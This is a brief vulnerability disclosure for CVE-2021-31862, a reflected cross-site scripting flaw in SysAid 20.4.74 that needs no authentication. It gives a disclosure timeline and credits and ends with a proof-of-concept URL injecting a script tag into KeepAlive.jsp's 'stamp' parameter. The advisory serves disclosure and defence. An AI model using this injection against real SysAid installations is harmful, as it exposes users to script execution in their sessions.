# CVE-2021-31862

SysAid 20.4.74 allows reflected XSS via the KeepAlive.jsp parameter, without authentication.


Timeline

Discovered: April 28, 2021

Initial Vendor Contact: April 28, 2021

Reported: April 28, 2021

CVE ID issued: April 28, 2021

Secondary Vendor Contact: (Vendor did not reply to initial contact): May 28, 2021

Public Release: October 29, 2021

Affected Versions:

20.4.74 and prior

Credit:

Citadel Cyber Security (https://www.citadel.co.il/)


POC Exploit:

The following URL path and query parameters will trigger an XSS vulnerability.

/KeepAlive.jsp?stamp=<script>alert(1)</script>&tabID=10&lastClick=1618311643298


![image](https://user-images.githubusercontent.com/68341018/139206439-dca9e0ba-5213-458b-8811-4e2ced3d8c73.png)
